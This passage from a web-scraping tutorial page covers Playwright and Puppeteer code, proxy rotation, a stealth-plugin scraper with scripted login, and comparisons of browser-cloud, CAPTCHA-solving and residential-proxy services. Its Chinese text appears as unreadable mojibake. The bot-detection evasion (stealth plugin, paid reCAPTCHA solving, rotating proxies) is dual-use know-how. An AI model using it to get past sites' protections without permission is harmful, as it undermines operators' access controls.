<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">proxies</span><span class="p">[</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">proxies</span><span class="p">.</span><span class="nx">length</span><span class="p">)];</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">chromium</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
<span class="w">        </span><span class="nx">proxy</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">server</span><span class="o">:</span><span class="w"> </span><span class="nx">proxy</span><span class="w"> </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// çˆ¬å–æ•°æ®...</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="3-å¤±è´¥é‡è¯•">3. å¤±è´¥é‡è¯•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">retryOperation</span><span class="p">(</span><span class="nx">operation</span><span class="p">,</span><span class="w"> </span><span class="nx">maxRetries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">maxRetries</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">operation</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Attempt </span><span class="si">${</span><span class="nx">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="si">}</span><span class="sb"> failed:`</span><span class="p">,</span><span class="w"> </span><span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nx">maxRetries</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="k">throw</span><span class="w"> </span><span class="nx">error</span><span class="p">;</span>
<span class="w">            </span><span class="k">await</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="p">)));</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨</span>
<span class="k">await</span><span class="w"> </span><span class="nx">retryOperation</span><span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="s1">&#39;#button&#39;</span><span class="p">);</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å®Œæ•´çˆ¬è™«ç¤ºä¾‹">å®Œæ•´çˆ¬è™«ç¤ºä¾‹</h2>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">puppeteer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer-extra&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">StealthPlugin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer-extra-plugin-stealth&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>

<span class="nx">puppeteer</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">StealthPlugin</span><span class="p">());</span>

<span class="kd">class</span><span class="w"> </span><span class="nx">WebScraper</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
<span class="w">            </span><span class="nx">headless</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">            </span><span class="nx">args</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;--no-sandbox&#39;</span><span class="p">]</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">setViewport</span><span class="p">({</span><span class="w"> </span><span class="nx">width</span><span class="o">:</span><span class="w"> </span><span class="mf">1920</span><span class="p">,</span><span class="w"> </span><span class="nx">height</span><span class="o">:</span><span class="w"> </span><span class="mf">1080</span><span class="w"> </span><span class="p">});</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">login</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com/login&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;#username&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">delay</span><span class="o">:</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="p">});</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;#password&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">delay</span><span class="o">:</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="p">});</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="s1">&#39;#login-button&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">waitForNavigation</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">scrapeData</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">items</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="s1">&#39;.item&#39;</span><span class="p">).</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">item</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">items</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
<span class="w">                    </span><span class="nx">title</span><span class="o">:</span><span class="w"> </span><span class="nx">item</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;.title&#39;</span><span class="p">)</span><span class="o">?</span><span class="p">.</span><span class="nx">innerText</span><span class="p">,</span>
<span class="w">                    </span><span class="nx">price</span><span class="o">:</span><span class="w"> </span><span class="nx">item</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;.price&#39;</span><span class="p">)</span><span class="o">?</span><span class="p">.</span><span class="nx">innerText</span><span class="p">,</span>
<span class="w">                    </span><span class="nx">link</span><span class="o">:</span><span class="w"> </span><span class="nx">item</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">?</span><span class="p">.</span><span class="nx">href</span>
<span class="w">                </span><span class="p">});</span>
<span class="w">            </span><span class="p">});</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">items</span><span class="p">;</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">data</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">close</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨</span>
<span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">scraper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">WebScraper</span><span class="p">();</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">scraper</span><span class="p">.</span><span class="nx">init</span><span class="p">();</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">scraper</span><span class="p">.</span><span class="nx">login</span><span class="p">(</span><span class="s1">&#39;myuser&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;mypassword&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">scraper</span><span class="p">.</span><span class="nx">scrapeData</span><span class="p">(</span><span class="s1">&#39;https://example.com/products&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="s1">&#39;data.json&#39;</span><span class="p">,</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">));</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">scraper</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å•†ä¸šåŒ–æµè§ˆå™¨è‡ªåŠ¨åŒ–è§£å†³æ–¹æ¡ˆå¯¹æ¯”">å•†ä¸šåŒ–æµè§ˆå™¨è‡ªåŠ¨åŒ–è§£å†³æ–¹æ¡ˆå¯¹æ¯”</h2>

      <p>åœ¨å¤§è§„æ¨¡æ•°æ®é‡‡é›†å’Œè‡ªåŠ¨åŒ–æµ‹è¯•åœºæ™¯ä¸­ï¼Œå•†ä¸šåŒ–æœåŠ¡å¯ä»¥æ˜¾è‘—é™ä½è¿ç»´æˆæœ¬å’ŒæŠ€æœ¯é—¨æ§›ã€‚ä»¥ä¸‹æ˜¯å¸‚åœºä¸»æµæ–¹æ¡ˆçš„è¯¦ç»†å¯¹æ¯”ã€‚</p>

      <h3 id="1-å•†ä¸šæµè§ˆå™¨äº‘æœåŠ¡browser-as-a-service">1. å•†ä¸šæµè§ˆå™¨äº‘æœåŠ¡ï¼ˆBrowser-as-a-Serviceï¼‰</h3>

      <h4 id="browserlessio">Browserless.io</h4>

      <p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>æ‰˜ç®¡å¼æ— å¤´æµè§ˆå™¨æœåŠ¡</li>
        <li>è‡ªåŠ¨æ‰©å±•ï¼Œæ— éœ€è¿ç»´</li>
        <li>å†…ç½®åæ£€æµ‹å’Œä»£ç†æ± </li>
        <li>æ”¯æŒ Puppeteer/Playwright API</li>
      </ul>

      <p><strong>å®šä»·</strong>:</p>

      <ul>
        <li>Hobby: $29/æœˆï¼ˆ10,000æ¬¡è¯·æ±‚ï¼‰</li>
        <li>Startup: $79/æœˆï¼ˆ50,000æ¬¡è¯·æ±‚ï¼‰</li>
        <li>Business: $299/æœˆï¼ˆ250,000æ¬¡è¯·æ±‚ï¼‰</li>
        <li>Enterprise: å®šåˆ¶åŒ–</li>
      </ul>

      <p><strong>æŠ€æœ¯è§„æ ¼</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä½¿ç”¨ç¤ºä¾‹ - ä¸ Puppeteer å®Œå…¨å…¼å®¹</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">puppeteer</span><span class="p">.</span><span class="nx">connect</span><span class="p">({</span>
<span class="w">    </span><span class="nx">browserWSEndpoint</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;wss://chrome.browserless.io?token=YOUR_TOKEN&#39;</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>é€‚ç”¨åœºæ™¯</strong>:</p>

      <ul>
        <li>PDFç”ŸæˆæœåŠ¡</li>
        <li>ç½‘é¡µæˆªå›¾API</li>
        <li>è½»é‡çº§çˆ¬è™«ï¼ˆ&lt; 100ä¸‡é¡µ/æœˆï¼‰</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://www.browserless.io/</p>

      <p><strong>ä¼˜åŠ£åˆ†æ</strong>:</p>

      <ul>
        <li>âœ… é›¶è¿ç»´æˆæœ¬</li>
        <li>âœ… æŒ‰éœ€ä»˜è´¹</li>
        <li>âŒ å—é™äºä¾›åº”å•†ç½‘ç»œ</li>
        <li>âŒ å¤§è§„æ¨¡åœºæ™¯æˆæœ¬é«˜</li>
      </ul>

      <hr />

      <h4 id="browserstack-automate">BrowserStack Automate</h4>

      <p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>2000+çœŸå®è®¾å¤‡å’Œæµè§ˆå™¨ç»„åˆ</li>
        <li>ä¼ä¸šçº§å¯é æ€§ï¼ˆ99.9% SLAï¼‰</li>
        <li>è¯¦ç»†çš„æµ‹è¯•æŠ¥å‘Šå’Œè§†é¢‘å½•åˆ¶</li>
        <li>ä¸CI/CDæ— ç¼é›†æˆ</li>
      </ul>

      <p><strong>å®šä»·</strong>:</p>

      <ul>
        <li>Team: $29/æœˆï¼ˆ1ä¸ªå¹¶å‘ï¼‰</li>
        <li>Business: $99/æœˆï¼ˆ5ä¸ªå¹¶å‘ï¼‰</li>
        <li>Enterprise: $299/æœˆèµ·ï¼ˆ25ä¸ªå¹¶å‘ï¼‰</li>
      </ul>

      <p><strong>æŠ€æœ¯è§„æ ¼</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Selenium é›†æˆ</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">caps</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="s1">&#39;bstack:options&#39;</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">userName</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;YOUR_USERNAME&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">accessKey</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;YOUR_KEY&#39;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">browserName</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Chrome&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">browserVersion</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;latest&#39;</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p><strong>é€‚ç”¨åœºæ™¯</strong>:</p>

      <ul>
        <li>è·¨æµè§ˆå™¨å…¼å®¹æ€§æµ‹è¯•</li>
        <li>ç§»åŠ¨ç«¯è‡ªåŠ¨åŒ–æµ‹è¯•</li>
        <li>ä¼ä¸šçº§ QA è‡ªåŠ¨åŒ–</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://www.browserstack.com/</p>

      <p><strong>ç«å“å¯¹æ¯”</strong>:</p>

      <ul>
        <li>Sauce Labsï¼ˆç±»ä¼¼å®šä»·å’ŒåŠŸèƒ½ï¼‰</li>
        <li>LambdaTestï¼ˆæ›´ä¾¿å®œï¼Œ$15/æœˆèµ·ï¼‰</li>
      </ul>

      <hr />

      <h4 id="apify">Apify</h4>

      <p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>ä¸“ä¸šç½‘é¡µçˆ¬å–å¹³å°</li>
        <li>1000+ ç°æˆçš„çˆ¬è™«Actor</li>
        <li>å†…ç½®ä»£ç†æ± å’Œåæ£€æµ‹</li>
        <li>Serverless æ¶æ„</li>
      </ul>

      <p><strong>å®šä»·</strong>:</p>

      <ul>
        <li>Free: $0ï¼ˆæ¯æœˆ$5é¢åº¦ï¼‰</li>
        <li>Personal: $49/æœˆ</li>
        <li>Team: $499/æœˆ</li>
        <li>Enterprise: å®šåˆ¶åŒ–</li>
      </ul>

      <p><strong>æŠ€æœ¯ç‰¹ç‚¹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Actor ç¤ºä¾‹ - çˆ¬å–Googleæœç´¢</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">Apify</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;apify&#39;</span><span class="p">);</span>

<span class="nx">Apify</span><span class="p">.</span><span class="nx">main</span><span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">requestQueue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">Apify</span><span class="p">.</span><span class="nx">openRequestQueue</span><span class="p">();</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">requestQueue</span><span class="p">.</span><span class="nx">addRequest</span><span class="p">({</span><span class="w"> </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;https://google.com&#39;</span><span class="w"> </span><span class="p">});</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">crawler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Apify</span><span class="p">.</span><span class="nx">PuppeteerCrawler</span><span class="p">({</span>
<span class="w">        </span><span class="nx">requestQueue</span><span class="p">,</span>
<span class="w">        </span><span class="nx">handlePageFunction</span><span class="o">:</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">({</span><span class="w"> </span><span class="nx">page</span><span class="p">,</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">title</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">title</span><span class="p">();</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Title: </span><span class="si">${</span><span class="nx">title</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">crawler</span><span class="p">.</span><span class="nx">run</span><span class="p">();</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>é€‚ç”¨åœºæ™¯</strong>:</p>

      <ul>
        <li>ä¸­å¤§è§„æ¨¡æ•°æ®é‡‡é›†</li>
        <li>å¸‚åœºç›‘æµ‹å’Œä»·æ ¼è¿½è¸ª</li>
        <li>æ— éœ€ç»´æŠ¤åŸºç¡€è®¾æ–½çš„å›¢é˜Ÿ</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://apify.com/</p>

      <hr />

      <h3 id="2-éªŒè¯ç æ‰“ç æœåŠ¡å¯¹æ¯”">2. éªŒè¯ç æ‰“ç æœåŠ¡å¯¹æ¯”</h3>

      <table>
        <thead>
          <tr>
            <th>æœåŠ¡å•†</th>
            <th>reCAPTCHA v2</th>
            <th>reCAPTCHA v3</th>
            <th>hCaptcha</th>
            <th>æ»‘å—éªŒè¯ç </th>
            <th>ä»·æ ¼ï¼ˆ1000æ¬¡ï¼‰</th>
            <th>æˆåŠŸç‡</th>
            <th>é€Ÿåº¦</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>2Captcha</strong></td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>$2.99</td>
            <td>95%+</td>
            <td>10-30s</td>
          </tr>
          <tr>
            <td><strong>Anti-Captcha</strong></td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>$2.00</td>
            <td>96%+</td>
            <td>8-25s</td>
          </tr>
          <tr>
            <td><strong>CapSolver</strong></td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>$1.50</td>
            <td>94%+</td>
            <td>15-35s</td>
          </tr>
          <tr>
            <td><strong>DeathByCaptcha</strong></td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âŒ</td>
            <td>âœ…</td>
            <td>$1.39</td>
            <td>92%+</td>
            <td>20-40s</td>
          </tr>
          <tr>
            <td><strong>CapMonster Cloud</strong></td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>$0.90</td>
            <td>93%+</td>
            <td>15-30s</td>
          </tr>
        </tbody>
      </table>

      <h4 id="æ¨èæ–¹æ¡ˆ">æ¨èæ–¹æ¡ˆ</h4>

      <p><strong>2Captcha</strong>ï¼ˆæœ€å¯é ï¼‰</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">solver</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Captcha</span><span class="p">.</span><span class="nx">Solver</span><span class="p">(</span><span class="s1">&#39;YOUR_API_KEY&#39;</span><span class="p">);</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">solver</span><span class="p">.</span><span class="nx">recaptcha</span><span class="p">({</span>
<span class="w">    </span><span class="nx">pageurl</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;https://example.com&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">googlekey</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">version</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;v2&#39;</span>
<span class="p">});</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Token:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>å®˜ç½‘</strong>: https://2captcha.com/<br />
        <strong>æˆæœ¬ä¼°ç®—</strong>: 10ä¸‡æ¬¡éªŒè¯ç  â‰ˆ $300
      </p>

      <hr />

      <p><strong>Anti-Captcha</strong>ï¼ˆé€Ÿåº¦æœ€å¿«ï¼‰</p>

      <ul>
        <li>æ”¯æŒæµè§ˆå™¨æ‰©å±•è‡ªåŠ¨é›†æˆ</li>
        <li>æä¾›Puppeteer/Playwrightæ’ä»¶</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://anti-captcha.com/</p>

      <hr />

      <h3 id="3-ä»£ç†ipæœåŠ¡å¯¹æ¯”">3. ä»£ç†IPæœåŠ¡å¯¹æ¯”</h3>

      <h4 id="ä½å®…ä»£ç†residential-proxy">ä½å®…ä»£ç†ï¼ˆResidential Proxyï¼‰</h4>

      <p><strong>Bright Data</strong>ï¼ˆåŸLuminatiï¼‰</p>

      <ul>
        <li>æœ€å¤§çš„ä½å®…IPæ± ï¼ˆ7200ä¸‡+ï¼‰</li>
        <li>æŒ‰æµé‡è®¡è´¹ï¼š$12.75/GBèµ·</li>
        <li>ä¼ä¸šçº§å¯é æ€§</li>
        <li><strong>å®˜ç½‘</strong>: https://brightdata.com/</li>
      </ul>

      <p><strong>Smartproxy</strong></p>

      <ul>
        <li>4000ä¸‡+ ä½å®…IP</li>
        <li>æŒ‰æµé‡è®¡è´¹ï¼š$12.50/GBèµ·</li>
        <li>æ›´å‹å¥½çš„å®šä»·</li>
        <li><strong>å®˜ç½‘</strong>: https://smartproxy.com/</li>
      </ul>

      <p><strong>å¯¹æ¯”</strong>:</p>

      <table>
        <thead>
          <tr>
            <th>ç‰¹æ€§</th>
            <th>Bright Data</th>
            <th>Smartproxy</th>
            <th>Oxylabs</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>IPæ± å¤§å°</td>
            <td>7200ä¸‡+</td>
            <td>4000ä¸‡+</td>
            <td>1äº¿+</td>
          </tr>
          <tr>
            <td>ä»·æ ¼/GB</td>
            <td>$12.75</td>
            <td>$12.50</td>
            <td>$15.00</td>
